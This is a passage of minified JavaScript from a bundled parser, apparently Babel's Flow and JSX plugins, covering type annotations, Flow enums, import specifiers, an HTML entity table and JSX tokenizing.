this.next(),this.flowParseInterface(Y)}else if(this.isContextual(126)){Q.exportKind="value";let Y=this.startNode();return this.next(),this.flowParseEnumDeclaration(Y)}else return super.parseExportDeclaration(Q)}eatExportStar(Q){if(super.eatExportStar(Q))return!0;if(this.isContextual(130)&&this.lookahead().type===55)return Q.exportKind="type",this.next(),this.next(),!0;return!1}maybeParseExportNamespaceSpecifier(Q){let{startLoc:Y}=this.state,W=super.maybeParseExportNamespaceSpecifier(Q);if(W&&Q.exportKind==="type")this.unexpected(Y);return W}parseClassId(Q,Y,W){if(super.parseClassId(Q,Y,W),this.match(47))Q.typeParameters=this.flowParseTypeParameterDeclaration()}parseClassMember(Q,Y,W){let{startLoc:z}=this.state;if(this.isContextual(125)){if(super.parseClassMemberFromModifier(Q,Y))return;Y.declare=!0}if(super.parseClassMember(Q,Y,W),Y.declare){if(Y.type!=="ClassProperty"&&Y.type!=="ClassPrivateProperty"&&Y.type!=="PropertyDefinition")this.raise(l1.DeclareClassElement,z);else if(Y.value)this.raise(l1.DeclareClassFieldInitializer,Y.value)}}isIterator(Q){return Q==="iterator"||Q==="asyncIterator"}readIterator(){let Q=super.readWord1(),Y="@@"+Q;if(!this.isIterator(Q)||!this.state.inType)this.raise(b.InvalidIdentifier,this.state.curPosition(),{identifierName:Y});this.finishToken(132,Y)}getTokenFromCode(Q){let Y=this.input.charCodeAt(this.state.pos+1);if(Q===123&&Y===124)this.finishOp(6,2);else if(this.state.inType&&(Q===62||Q===60))this.finishOp(Q===62?48:47,1);else if(this.state.inType&&Q===63)if(Y===46)this.finishOp(18,2);else this.finishOp(17,1);else if(W_(Q,Y,this.input.charCodeAt(this.state.pos+2)))this.state.pos+=2,this.readIterator();else super.getTokenFromCode(Q)}isAssignable(Q,Y){if(Q.type==="TypeCastExpression")return this.isAssignable(Q.expression,Y);else return super.isAssignable(Q,Y)}toAssignable(Q,Y=!1){if(!Y&&Q.type==="AssignmentExpression"&&Q.left.type==="TypeCastExpression")Q.left=this.typeCastToParameter(Q.left);super.toAssignable(Q,Y)}toAssignableList(Q,Y,W){for(let z=0;z<Q.length;z++){let G=Q[z];if((G==null?void 0:G.type)==="TypeCastExpression")Q[z]=this.typeCastToParameter(G)}super.toAssignableList(Q,Y,W)}toReferencedList(Q,Y){for(let z=0;z<Q.length;z++){var W;let G=Q[z];if(G&&G.type==="TypeCastExpression"&&!((W=G.extra)!=null&&W.parenthesized)&&(Q.length>1||!Y))this.raise(l1.TypeCastInPattern,G.typeAnnotation)}return Q}parseArrayLike(Q,Y,W,z){let G=super.parseArrayLike(Q,Y,W,z);if(Y&&!this.state.maybeInArrowParameters)this.toReferencedList(G.elements);return G}isValidLVal(Q,Y,W){return Q==="TypeCastExpression"||super.isValidLVal(Q,Y,W)}parseClassProperty(Q){if(this.match(14))Q.typeAnnotation=this.flowParseTypeAnnotation();return super.parseClassProperty(Q)}parseClassPrivateProperty(Q){if(this.match(14))Q.typeAnnotation=this.flowParseTypeAnnotation();return super.parseClassPrivateProperty(Q)}isClassMethod(){return this.match(47)||super.isClassMethod()}isClassProperty(){return this.match(14)||super.isClassProperty()}isNonstaticConstructor(Q){return!this.match(14)&&super.isNonstaticConstructor(Q)}pushClassMethod(Q,Y,W,z,G,H){if(Y.variance)this.unexpected(Y.variance.loc.start);if(delete Y.variance,this.match(47))Y.typeParameters=this.flowParseTypeParameterDeclaration();if(super.pushClassMethod(Q,Y,W,z,G,H),Y.params&&G){let U=Y.params;if(U.length>0&&this.isThisParam(U[0]))this.raise(l1.ThisParamBannedInConstructor,Y)}else if(Y.type==="MethodDefinition"&&G&&Y.value.params){let U=Y.value.params;if(U.length>0&&this.isThisParam(U[0]))this.raise(l1.ThisParamBannedInConstructor,Y)}}pushClassPrivateMethod(Q,Y,W,z){if(Y.variance)this.unexpected(Y.variance.loc.start);if(delete Y.variance,this.match(47))Y.typeParameters=this.flowParseTypeParameterDeclaration();super.pushClassPrivateMethod(Q,Y,W,z)}parseClassSuper(Q){if(super.parseClassSuper(Q),Q.superClass&&(this.match(47)||this.match(51)))Q.superTypeParameters=this.flowParseTypeParameterInstantiationInExpression();if(this.isContextual(113)){this.next();let Y=Q.implements=[];do{let W=this.startNode();if(W.id=this.flowParseRestrictedIdentifier(!0),this.match(47))W.typeParameters=this.flowParseTypeParameterInstantiation();else W.typeParameters=null;Y.push(this.finishNode(W,"ClassImplements"))}while(this.eat(12))}}checkGetterSetterParams(Q){super.checkGetterSetterParams(Q);let Y=this.getObjectOrClassMethodParams(Q);if(Y.length>0){let W=Y[0];if(this.isThisParam(W)&&Q.kind==="get")this.raise(l1.GetterMayNotHaveThisParam,W);else if(this.isThisParam(W))this.raise(l1.SetterMayNotHaveThisParam,W)}}parsePropertyNamePrefixOperator(Q){Q.variance=this.flowParseVariance()}parseObjPropValue(Q,Y,W,z,G,H,U){if(Q.variance)this.unexpected(Q.variance.loc.start);delete Q.variance;let K;if(this.match(47)&&!H){if(K=this.flowParseTypeParameterDeclaration(),!this.match(10))this.unexpected()}let V=super.parseObjPropValue(Q,Y,W,z,G,H,U);if(K)(V.value||V).typeParameters=K;return V}parseFunctionParamType(Q){if(this.eat(17)){if(Q.type!=="Identifier")this.raise(l1.PatternIsOptional,Q);if(this.isThisParam(Q))this.raise(l1.ThisParamMayNotBeOptional,Q);Q.optional=!0}if(this.match(14))Q.typeAnnotation=this.flowParseTypeAnnotation();else if(this.isThisParam(Q))this.raise(l1.ThisParamAnnotationRequired,Q);if(this.match(29)&&this.isThisParam(Q))this.raise(l1.ThisParamNoDefault,Q);return this.resetEndLocation(Q),Q}parseMaybeDefault(Q,Y){let W=super.parseMaybeDefault(Q,Y);if(W.type==="AssignmentPattern"&&W.typeAnnotation&&W.right.start<W.typeAnnotation.start)this.raise(l1.TypeBeforeInitializer,W.typeAnnotation);return W}checkImportReflection(Q){if(super.checkImportReflection(Q),Q.module&&Q.importKind!=="value")this.raise(l1.ImportReflectionHasImportType,Q.specifiers[0].loc.start)}parseImportSpecifierLocal(Q,Y,W){Y.local=bK(Q)?this.flowParseRestrictedIdentifier(!0,!0):this.parseIdentifier(),Q.specifiers.push(this.finishImportSpecifier(Y,W))}isPotentialImportPhase(Q){if(super.isPotentialImportPhase(Q))return!0;if(this.isContextual(130)){if(!Q)return!0;let Y=this.lookaheadCharCode();return Y===123||Y===42}return!Q&&this.isContextual(87)}applyImportPhase(Q,Y,W,z){if(super.applyImportPhase(Q,Y,W,z),Y){if(!W&&this.match(65))return;Q.exportKind=W==="type"?W:"value"}else{if(W==="type"&&this.match(55))this.unexpected();Q.importKind=W==="type"||W==="typeof"?W:"value"}}parseImportSpecifier(Q,Y,W,z,G){let H=Q.imported,U=null;if(H.type==="Identifier"){if(H.name==="type")U="type";else if(H.name==="typeof")U="typeof"}let K=!1;if(this.isContextual(93)&&!this.isLookaheadContextual("as")){let B=this.parseIdentifier(!0);if(U!==null&&!I8(this.state.type))Q.imported=B,Q.importKind=U,Q.local=this.cloneIdentifier(B);else Q.imported=H,Q.importKind=null,Q.local=this.parseIdentifier()}else{if(U!==null&&I8(this.state.type))Q.imported=this.parseIdentifier(!0),Q.importKind=U;else{if(Y)throw this.raise(b.ImportBindingIsString,Q,{importName:H.value});Q.imported=H,Q.importKind=null}if(this.eatContextual(93))Q.local=this.parseIdentifier();else K=!0,Q.local=this.cloneIdentifier(Q.imported)}let V=bK(Q);if(W&&V)this.raise(l1.ImportTypeShorthandOnlyInPureImport,Q);if(W||V)this.checkReservedType(Q.local.name,Q.local.loc.start,!0);if(K&&!W&&!V)this.checkReservedWord(Q.local.name,Q.loc.start,!0,!0);return this.finishImportSpecifier(Q,"ImportSpecifier")}parseBindingAtom(){switch(this.state.type){case 78:return this.parseIdentifier(!0);default:return super.parseBindingAtom()}}parseFunctionParams(Q,Y){let W=Q.kind;if(W!=="get"&&W!=="set"&&this.match(47))Q.typeParameters=this.flowParseTypeParameterDeclaration();super.parseFunctionParams(Q,Y)}parseVarId(Q,Y){if(super.parseVarId(Q,Y),this.match(14))Q.id.typeAnnotation=this.flowParseTypeAnnotation(),this.resetEndLocation(Q.id)}parseAsyncArrowFromCallExpression(Q,Y){if(this.match(14)){let W=this.state.noAnonFunctionType;this.state.noAnonFunctionType=!0,Q.returnType=this.flowParseTypeAnnotation(),this.state.noAnonFunctionType=W}return super.parseAsyncArrowFromCallExpression(Q,Y)}shouldParseAsyncArrow(){return this.match(14)||super.shouldParseAsyncArrow()}parseMaybeAssign(Q,Y){var W;let z=null,G;if(this.hasPlugin("jsx")&&(this.match(143)||this.match(47))){if(z=this.state.clone(),G=this.tryParse(()=>super.parseMaybeAssign(Q,Y),z),!G.error)return G.node;let{context:K}=this.state,V=K[K.length-1];if(V===w0.j_oTag||V===w0.j_expr)K.pop()}if((W=G)!=null&&W.error||this.match(47)){var H,U;z=z||this.state.clone();let K,V=this.tryParse((Z)=>{var M;K=this.flowParseTypeParameterDeclaration();let F=this.forwardNoArrowParamsConversionAt(K,()=>{let O=super.parseMaybeAssign(Q,Y);return this.resetStartLocationFromNode(O,K),O});if((M=F.extra)!=null&&M.parenthesized)Z();let j=this.maybeUnwrapTypeCastExpression(F);if(j.type!=="ArrowFunctionExpression")Z();return j.typeParameters=K,this.resetStartLocationFromNode(j,K),F},z),B=null;if(V.node&&this.maybeUnwrapTypeCastExpression(V.node).type==="ArrowFunctionExpression"){if(!V.error&&!V.aborted){if(V.node.async)this.raise(l1.UnexpectedTypeParameterBeforeAsyncArrowFunction,K);return V.node}B=V.node}if((H=G)!=null&&H.node)return this.state=G.failState,G.node;if(B)return this.state=V.failState,B;if((U=G)!=null&&U.thrown)throw G.error;if(V.thrown)throw V.error;throw this.raise(l1.UnexpectedTokenAfterTypeParameter,K)}return super.parseMaybeAssign(Q,Y)}parseArrow(Q){if(this.match(14)){let Y=this.tryParse(()=>{let W=this.state.noAnonFunctionType;this.state.noAnonFunctionType=!0;let z=this.startNode();if([z.typeAnnotation,Q.predicate]=this.flowParseTypeAndPredicateInitialiser(),this.state.noAnonFunctionType=W,this.canInsertSemicolon())this.unexpected();if(!this.match(19))this.unexpected();return z});if(Y.thrown)return null;if(Y.error)this.state=Y.failState;Q.returnType=Y.node.typeAnnotation?this.finishNode(Y.node,"TypeAnnotation"):null}return super.parseArrow(Q)}shouldParseArrow(Q){return this.match(14)||super.shouldParseArrow(Q)}setArrowFunctionParameters(Q,Y){if(this.state.noArrowParamsConversionAt.includes(this.offsetToSourcePos(Q.start)))Q.params=Y;else super.setArrowFunctionParameters(Q,Y)}checkParams(Q,Y,W,z=!0){if(W&&this.state.noArrowParamsConversionAt.includes(this.offsetToSourcePos(Q.start)))return;for(let G=0;G<Q.params.length;G++)if(this.isThisParam(Q.params[G])&&G>0)this.raise(l1.ThisParamMustBeFirst,Q.params[G]);super.checkParams(Q,Y,W,z)}parseParenAndDistinguishExpression(Q){return super.parseParenAndDistinguishExpression(Q&&!this.state.noArrowAt.includes(this.sourceToOffsetPos(this.state.start)))}parseSubscripts(Q,Y,W){if(Q.type==="Identifier"&&Q.name==="async"&&this.state.noArrowAt.includes(Y.index)){this.next();let z=this.startNodeAt(Y);z.callee=Q,z.arguments=super.parseCallExpressionArguments(),Q=this.finishNode(z,"CallExpression")}else if(Q.type==="Identifier"&&Q.name==="async"&&this.match(47)){let z=this.state.clone(),G=this.tryParse((U)=>this.parseAsyncArrowWithTypeParameters(Y)||U(),z);if(!G.error&&!G.aborted)return G.node;let H=this.tryParse(()=>super.parseSubscripts(Q,Y,W),z);if(H.node&&!H.error)return H.node;if(G.node)return this.state=G.failState,G.node;if(H.node)return this.state=H.failState,H.node;throw G.error||H.error}return super.parseSubscripts(Q,Y,W)}parseSubscript(Q,Y,W,z){if(this.match(18)&&this.isLookaheadToken_lt()){if(z.optionalChainMember=!0,W)return z.stop=!0,Q;this.next();let G=this.startNodeAt(Y);return G.callee=Q,G.typeArguments=this.flowParseTypeParameterInstantiationInExpression(),this.expect(10),G.arguments=this.parseCallExpressionArguments(),G.optional=!0,this.finishCallExpression(G,!0)}else if(!W&&this.shouldParseTypes()&&(this.match(47)||this.match(51))){let G=this.startNodeAt(Y);G.callee=Q;let H=this.tryParse(()=>{if(G.typeArguments=this.flowParseTypeParameterInstantiationCallOrNew(),this.expect(10),G.arguments=super.parseCallExpressionArguments(),z.optionalChainMember)G.optional=!1;return this.finishCallExpression(G,z.optionalChainMember)});if(H.node){if(H.error)this.state=H.failState;return H.node}}return super.parseSubscript(Q,Y,W,z)}parseNewCallee(Q){super.parseNewCallee(Q);let Y=null;if(this.shouldParseTypes()&&this.match(47))Y=this.tryParse(()=>this.flowParseTypeParameterInstantiationCallOrNew()).node;Q.typeArguments=Y}parseAsyncArrowWithTypeParameters(Q){let Y=this.startNodeAt(Q);if(this.parseFunctionParams(Y,!1),!this.parseArrow(Y))return;return super.parseArrowExpression(Y,void 0,!0)}readToken_mult_modulo(Q){let Y=this.input.charCodeAt(this.state.pos+1);if(Q===42&&Y===47&&this.state.hasFlowComment){this.state.hasFlowComment=!1,this.state.pos+=2,this.nextToken();return}super.readToken_mult_modulo(Q)}readToken_pipe_amp(Q){let Y=this.input.charCodeAt(this.state.pos+1);if(Q===124&&Y===125){this.finishOp(9,2);return}super.readToken_pipe_amp(Q)}parseTopLevel(Q,Y){let W=super.parseTopLevel(Q,Y);if(this.state.hasFlowComment)this.raise(l1.UnterminatedFlowComment,this.state.curPosition());return W}skipBlockComment(){if(this.hasPlugin("flowComments")&&this.skipFlowComment()){if(this.state.hasFlowComment)throw this.raise(l1.NestedFlowComment,this.state.startLoc);this.hasFlowCommentCompletion();let Q=this.skipFlowComment();if(Q)this.state.pos+=Q,this.state.hasFlowComment=!0;return}return super.skipBlockComment(this.state.hasFlowComment?"*-/":"*/")}skipFlowComment(){let{pos:Q}=this.state,Y=2;while([32,9].includes(this.input.charCodeAt(Q+Y)))Y++;let W=this.input.charCodeAt(Y+Q),z=this.input.charCodeAt(Y+Q+1);if(W===58&&z===58)return Y+2;if(this.input.slice(Y+Q,Y+Q+12)==="flow-include")return Y+12;if(W===58&&z!==58)return Y;return!1}hasFlowCommentCompletion(){if(this.input.indexOf("*/",this.state.pos)===-1)throw this.raise(b.UnterminatedComment,this.state.curPosition())}flowEnumErrorBooleanMemberNotInitialized(Q,{enumName:Y,memberName:W}){this.raise(l1.EnumBooleanMemberNotInitialized,Q,{memberName:W,enumName:Y})}flowEnumErrorInvalidMemberInitializer(Q,Y){return this.raise(!Y.explicitType?l1.EnumInvalidMemberInitializerUnknownType:Y.explicitType==="symbol"?l1.EnumInvalidMemberInitializerSymbolType:l1.EnumInvalidMemberInitializerPrimaryType,Q,Y)}flowEnumErrorNumberMemberNotInitialized(Q,Y){this.raise(l1.EnumNumberMemberNotInitialized,Q,Y)}flowEnumErrorStringMemberInconsistentlyInitialized(Q,Y){this.raise(l1.EnumStringMemberInconsistentlyInitialized,Q,Y)}flowEnumMemberInit(){let Q=this.state.startLoc,Y=()=>this.match(12)||this.match(8);switch(this.state.type){case 135:{let W=this.parseNumericLiteral(this.state.value);if(Y())return{type:"number",loc:W.loc.start,value:W};return{type:"invalid",loc:Q}}case 134:{let W=this.parseStringLiteral(this.state.value);if(Y())return{type:"string",loc:W.loc.start,value:W};return{type:"invalid",loc:Q}}case 85:case 86:{let W=this.parseBooleanLiteral(this.match(85));if(Y())return{type:"boolean",loc:W.loc.start,value:W};return{type:"invalid",loc:Q}}default:return{type:"invalid",loc:Q}}}flowEnumMemberRaw(){let Q=this.state.startLoc,Y=this.parseIdentifier(!0),W=this.eat(29)?this.flowEnumMemberInit():{type:"none",loc:Q};return{id:Y,init:W}}flowEnumCheckExplicitTypeMismatch(Q,Y,W){let{explicitType:z}=Y;if(z===null)return;if(z!==W)this.flowEnumErrorInvalidMemberInitializer(Q,Y)}flowEnumMembers({enumName:Q,explicitType:Y}){let W=new Set,z={booleanMembers:[],numberMembers:[],stringMembers:[],defaultedMembers:[]},G=!1;while(!this.match(8)){if(this.eat(21)){G=!0;break}let H=this.startNode(),{id:U,init:K}=this.flowEnumMemberRaw(),V=U.name;if(V==="")continue;if(/^[a-z]/.test(V))this.raise(l1.EnumInvalidMemberName,U,{memberName:V,suggestion:V[0].toUpperCase()+V.slice(1),enumName:Q});if(W.has(V))this.raise(l1.EnumDuplicateMemberName,U,{memberName:V,enumName:Q});W.add(V);let B={enumName:Q,explicitType:Y,memberName:V};switch(H.id=U,K.type){case"boolean":{this.flowEnumCheckExplicitTypeMismatch(K.loc,B,"boolean"),H.init=K.value,z.booleanMembers.push(this.finishNode(H,"EnumBooleanMember"));break}case"number":{this.flowEnumCheckExplicitTypeMismatch(K.loc,B,"number"),H.init=K.value,z.numberMembers.push(this.finishNode(H,"EnumNumberMember"));break}case"string":{this.flowEnumCheckExplicitTypeMismatch(K.loc,B,"string"),H.init=K.value,z.stringMembers.push(this.finishNode(H,"EnumStringMember"));break}case"invalid":throw this.flowEnumErrorInvalidMemberInitializer(K.loc,B);case"none":switch(Y){case"boolean":this.flowEnumErrorBooleanMemberNotInitialized(K.loc,B);break;case"number":this.flowEnumErrorNumberMemberNotInitialized(K.loc,B);break;default:z.defaultedMembers.push(this.finishNode(H,"EnumDefaultedMember"))}}if(!this.match(8))this.expect(12)}return{members:z,hasUnknownMembers:G}}flowEnumStringMembers(Q,Y,{enumName:W}){if(Q.length===0)return Y;else if(Y.length===0)return Q;else if(Y.length>Q.length){for(let z of Q)this.flowEnumErrorStringMemberInconsistentlyInitialized(z,{enumName:W});return Y}else{for(let z of Y)this.flowEnumErrorStringMemberInconsistentlyInitialized(z,{enumName:W});return Q}}flowEnumParseExplicitType({enumName:Q}){if(!this.eatContextual(102))return null;if(!C0(this.state.type))throw this.raise(l1.EnumInvalidExplicitTypeUnknownSupplied,this.state.startLoc,{enumName:Q});let{value:Y}=this.state;if(this.next(),Y!=="boolean"&&Y!=="number"&&Y!=="string"&&Y!=="symbol")this.raise(l1.EnumInvalidExplicitType,this.state.startLoc,{enumName:Q,invalidEnumType:Y});return Y}flowEnumBody(Q,Y){let W=Y.name,z=Y.loc.start,G=this.flowEnumParseExplicitType({enumName:W});this.expect(5);let{members:H,hasUnknownMembers:U}=this.flowEnumMembers({enumName:W,explicitType:G});switch(Q.hasUnknownMembers=U,G){case"boolean":return Q.explicitType=!0,Q.members=H.booleanMembers,this.expect(8),this.finishNode(Q,"EnumBooleanBody");case"number":return Q.explicitType=!0,Q.members=H.numberMembers,this.expect(8),this.finishNode(Q,"EnumNumberBody");case"string":return Q.explicitType=!0,Q.members=this.flowEnumStringMembers(H.stringMembers,H.defaultedMembers,{enumName:W}),this.expect(8),this.finishNode(Q,"EnumStringBody");case"symbol":return Q.members=H.defaultedMembers,this.expect(8),this.finishNode(Q,"EnumSymbolBody");default:{let K=()=>{return Q.members=[],this.expect(8),this.finishNode(Q,"EnumStringBody")};Q.explicitType=!1;let V=H.booleanMembers.length,B=H.numberMembers.length,Z=H.stringMembers.length,M=H.defaultedMembers.length;if(!V&&!B&&!Z&&!M)return K();else if(!V&&!B)return Q.members=this.flowEnumStringMembers(H.stringMembers,H.defaultedMembers,{enumName:W}),this.expect(8),this.finishNode(Q,"EnumStringBody");else if(!B&&!Z&&V>=M){for(let F of H.defaultedMembers)this.flowEnumErrorBooleanMemberNotInitialized(F.loc.start,{enumName:W,memberName:F.id.name});return Q.members=H.booleanMembers,this.expect(8),this.finishNode(Q,"EnumBooleanBody")}else if(!V&&!Z&&B>=M){for(let F of H.defaultedMembers)this.flowEnumErrorNumberMemberNotInitialized(F.loc.start,{enumName:W,memberName:F.id.name});return Q.members=H.numberMembers,this.expect(8),this.finishNode(Q,"EnumNumberBody")}else return this.raise(l1.EnumInconsistentMemberValues,z,{enumName:W}),K()}}}flowParseEnumDeclaration(Q){let Y=this.parseIdentifier();return Q.id=Y,Q.body=this.flowEnumBody(this.startNode(),Y),this.finishNode(Q,"EnumDeclaration")}jsxParseOpeningElementAfterName(Q){if(this.shouldParseTypes()){if(this.match(47)||this.match(51))Q.typeArguments=this.flowParseTypeParameterInstantiationInExpression()}return super.jsxParseOpeningElementAfterName(Q)}isLookaheadToken_lt(){let Q=this.nextTokenStart();if(this.input.charCodeAt(Q)===60){let Y=this.input.charCodeAt(Q+1);return Y!==60&&Y!==61}return!1}reScan_lt_gt(){let{type:Q}=this.state;if(Q===47)this.state.pos-=1,this.readToken_lt();else if(Q===48)this.state.pos-=1,this.readToken_gt()}reScan_lt(){let{type:Q}=this.state;if(Q===51)return this.state.pos-=2,this.finishOp(47,1),47;return Q}maybeUnwrapTypeCastExpression(Q){return Q.type==="TypeCastExpression"?Q.expression:Q}},Z_={__proto__:null,quot:'"',amp:"&",apos:"'",lt:"<",gt:">",nbsp:"",iexcl:"",cent:"",pound:"",curren:"",yen:"",brvbar:"",sect:"",uml:"",copy:"",ordf:"",laquo:"",not:"",shy:"",reg:"",macr:"",deg:"",plusmn:"",sup2:"",sup3:"",acute:"",micro:"",para:"",middot:"",cedil:"",sup1:"",ordm:"",raquo:"",frac14:"",frac12:"",frac34:"",iquest:"",Agrave:"",Aacute:"",Acirc:"",Atilde:"",Auml:"",Aring:"",AElig:"",Ccedil:"",Egrave:"",Eacute:"",Ecirc:"",Euml:"",Igrave:"",Iacute:"",Icirc:"",Iuml:"",ETH:"",Ntilde:"",Ograve:"",Oacute:"",Ocirc:"",Otilde:"",Ouml:"",times:"",Oslash:"",Ugrave:"",Uacute:"",Ucirc:"",Uuml:"",Yacute:"",THORN:"",szlig:"",agrave:"",aacute:"",acirc:"",atilde:"",auml:"",aring:"",aelig:"",ccedil:"",egrave:"",eacute:"",ecirc:"",euml:"",igrave:"",iacute:"",icirc:"",iuml:"",eth:"",ntilde:"",ograve:"",oacute:"",ocirc:"",otilde:"",ouml:"",divide:"",oslash:"",ugrave:"",uacute:"",ucirc:"",uuml:"",yacute:"",thorn:"",yuml:"",OElig:"",oelig:"",Scaron:"",scaron:"",Yuml:"",fnof:"",circ:"",tilde:"",Alpha:"",Beta:"",Gamma:"",Delta:"",Epsilon:"",Zeta:"",Eta:"",Theta:"",Iota:"",Kappa:"",Lambda:"",Mu:"",Nu:"",Xi:"",Omicron:"",Pi:"",Rho:"",Sigma:"",Tau:"",Upsilon:"",Phi:"",Chi:"",Psi:"",Omega:"",alpha:"",beta:"",gamma:"",delta:"",epsilon:"",zeta:"",eta:"",theta:"",iota:"",kappa:"",lambda:"",mu:"",nu:"",xi:"",omicron:"",pi:"",rho:"",sigmaf:"",sigma:"",tau:"",upsilon:"",phi:"",chi:"",psi:"",omega:"",thetasym:"",upsih:"",piv:"",ensp:"",emsp:"",thinsp:"",zwnj:"",zwj:"",lrm:"",rlm:"",ndash:"",mdash:"",lsquo:"",rsquo:"",sbquo:"",ldquo:"",rdquo:"",bdquo:"",dagger:"",Dagger:"",bull:"",hellip:"",permil:"",prime:"",Prime:"",lsaquo:"",rsaquo:"",oline:"",frasl:"",euro:"",image:"",weierp:"",real:"",trade:"",alefsym:"",larr:"",uarr:"",rarr:"",darr:"",harr:"",crarr:"",lArr:"",uArr:"",rArr:"",dArr:"",hArr:"",forall:"",part:"",exist:"",empty:"",nabla:"",isin:"",notin:"",ni:"",prod:"",sum:"",minus:"",lowast:"",radic:"",prop:"",infin:"",ang:"",and:"",or:"",cap:"",cup:"",int:"",there4:"",sim:"",cong:"",asymp:"",ne:"",equiv:"",le:"",ge:"",sub:"",sup:"",nsub:"",sube:"",supe:"",oplus:"",otimes:"",perp:"",sdot:"",lceil:"",rceil:"",lfloor:"",rfloor:"",lang:"",rang:"",loz:"",spades:"",clubs:"",hearts:"",diams:""},M_=/\r\n|[\r\n\u2028\u2029]/,X4=new RegExp(M_.source,"g");function gJ(X){switch(X){case 10:case 13:case 8232:case 8233:return!0;default:return!1}}function vK(X,J,Q){for(let Y=J;Y<Q;Y++)if(gJ(X.charCodeAt(Y)))return!0;return!1}var uY=/(?:\s|\/\/.*|\/\*[^]*?\*\/)*/g,cY=/(?:[^\S\n\r\u2028\u2029]|\/\/.*|\/\*.*?\*\/)*/g;function F_(X){switch(X){case 9:case 11:case 12:case 32:case 160:case 5760:case 8192:case 8193:case 8194:case 8195:case 8196:case 8197:case 8198:case 8199:case 8200:case 8201:case 8202:case 8239:case 8287:case 12288:case 65279:return!0;default:return!1}}var PX=r8`jsx`({AttributeIsEmpty:"JSX attributes must only be assigned a non-empty expression.",MissingClosingTagElement:({openingTagName:X})=>`Expected corresponding JSX closing tag for <${X}>.`,MissingClosingTagFragment:"Expected corresponding JSX closing tag for <>.",UnexpectedSequenceExpression:"Sequence expressions cannot be directly nested inside JSX. Did you mean to wrap it in parentheses (...)?",UnexpectedToken:({unexpected:X,HTMLEntity:J})=>`Unexpected token \`${X}\`. Did you mean \`${J}\` or \`{'${X}'}\`?`,UnsupportedJsxValue:"JSX value should be either an expression or a quoted JSX text.",UnterminatedJsxContent:"Unterminated JSX contents.",UnwrappedAdjacentJSXElements:"Adjacent JSX elements must be wrapped in an enclosing tag. Did you want a JSX fragment <>...</>?"});function d6(X){return X?X.type==="JSXOpeningFragment"||X.type==="JSXClosingFragment":!1}function xJ(X){if(X.type==="JSXIdentifier")return X.name;if(X.type==="JSXNamespacedName")return X.namespace.name+":"+X.name.name;if(X.type==="JSXMemberExpression")return xJ(X.object)+"."+xJ(X.property);throw new Error("Node had unexpected type: "+X.type)}var j_=(X)=>class J extends X{jsxReadToken(){let Q="",Y=this.state.pos;for(;;){if(this.state.pos>=this.length)throw this.raise(PX.UnterminatedJsxContent,this.state.startLoc);let W=this.input.charCodeAt(this.state.pos);switch(W){case 60:case 123:if(this.state.pos===this.state.start){if(W===60&&this.state.canStartJSXElement)++this.state.pos,this.finishToken(143);else super.getTokenFromCode(W);return}Q+=this.input.slice(Y,this.state.pos),this.finishToken(142,Q);return;case 38:Q+=this.input.slice(Y,this.state.pos),Q+=this.jsxReadEntity(),Y=this.state.pos;break;case 62:case 125:default:if(gJ(W))Q+=this.input.slice(Y,this.state.pos),Q+=this.jsxReadNewLine(!0),Y=this.state.pos;else++this.state.pos}}}jsxReadNewLine(Q){let Y=this.input.charCodeAt(this.state.pos),W;if(++this.state.pos,Y===13&&this.input.charCodeAt(this.state.pos)===10)++this.state.pos,W=Q?`
`:`\r
`;else W=String.fromCharCode(Y);return++this.state.curLine,this.state.lineStart=this.state.pos,W}jsxReadString(Q){let Y="",W=++this.state.pos;for(;;){if(this.state.pos>=this.length)throw this.raise(b.UnterminatedString,this.state.startLoc);let z=this.input.charCodeAt(this.state.pos);if(z===Q)break;if(z===38)Y+=this.input.slice(W,this.state.pos),Y+=this.jsxReadEntity(),W=this.state.pos;else if(gJ(z))Y+=this.input.slice(W,this.state.pos),Y+=this.jsxReadNewLine(!1),W=this.state.pos;else++this.state.pos}Y+=this.input.slice(W,this.state.pos++),this.finishToken(134,Y)}jsxReadEntity(){let Q=++this.state.pos;if(this.codePointAtPos(this.state.pos)===35){++this.state.pos;let Y=10;if(this.codePointAtPos(this.state.pos)===120)Y=16,++this.state.pos;let W=this.readInt(Y,void 0,!1,"bail");if(W!==null&&this.codePointAtPos(this.state.pos)===59)return++this.state.pos,String.fromCodePoint(W)}else{let Y=0,W=!1;while(Y++<10&&this.state.pos<this.length&&!(W=this.codePointAtPos(this.state.pos)===59))++this.state.pos;if(W){let z=this.input.slice(Q,this.state.pos),G=Z_[z];if(++this.state.pos,G)return G}}return this.state.pos=Q,"&"}jsxReadWord(){let Q,Y=this.state.pos;do Q=this.input.charCodeAt(++this.state.pos);while(fJ(Q)||Q===45);this.finishToken(141,this.input.slice(Y,this.state.pos))}jsxParseIdentifier(){let Q=this.startNode();if(this.match(141))Q.name=this.state.value;else if(JW(this.state.type))Q.name=r6(this.state.type);else this.unexpected();return this.next(),this.finishNode(Q,"JSXIdentifier")}jsxParseNamespacedName(){let Q=this.state.startLoc,Y=this.jsxParseIdentifier();if(!this.eat(14))return Y;let W=this.startNodeAt(Q);return W.namespace=Y,W.name=this.jsxParseIdentifier(),this.finishNode(W,"JSXNamespacedName")}jsxParseElementName(){let Q=this.state.startLoc,Y=this.jsxParseNamespacedName();if(Y.type==="JSXNamespacedName")return Y;while(this.eat(16)){let W=this.startNodeAt(Q);W.object=Y,W.property=this.jsxParseIdentifier(),Y=this.finishNode(W,"JSXMemberExpression")}return Y}jsxParseAttributeValue(){let Q;switch(this.state.type){case 5:if(Q=this.startNode(),this.setContext(w0.brace),this.next(),Q=this.jsxParseExpressionContainer(Q,w0.j_oTag),Q.expression.type==="JSXEmptyExpression")this.raise(PX.AttributeIsEmpty,Q);return Q;case 143:case 134:return this.parseExprAtom();default:throw this.raise(PX.UnsupportedJsxValue,this.state.startLoc)}}jsxParseEmptyExpression(){let Q=this.startNodeAt(this.state.lastTokEndLoc);return this.finishNodeAt(Q,"JSXEmptyExpression",this.state.startLoc)}jsxParseSpreadChild(Q){return this.next(),Q.expression=this.parseExpression(),this.setContext(w0.j_expr),this.state.canStartJSXElement=!0,this.expect(8),this.finishNode(Q,"JSXSpreadChild")}jsxParseExpressionContainer(Q,Y){if(this.match(8))Q.expression=this.jsxParseEmptyExpression();else{let W=this.parseExpression();Q.expression=W}return this.setContext(Y),this.state.canStartJSXElement=!0,this.expect(8),this.finishNode(Q,"JSXExpressionContainer")}jsxParseAttribute(){let Q=this.startNode();if(this.match(5))return this.setContext(w0.brace),this.next(),this.expect(21),Q.argument=this.parseMaybeAssignAllowIn(),this.setContext(w0.j_oTag),this.state.canStartJSXElement=!0,this.expect(8),this.finishNode(Q,"JSXSpreadAttribute");return 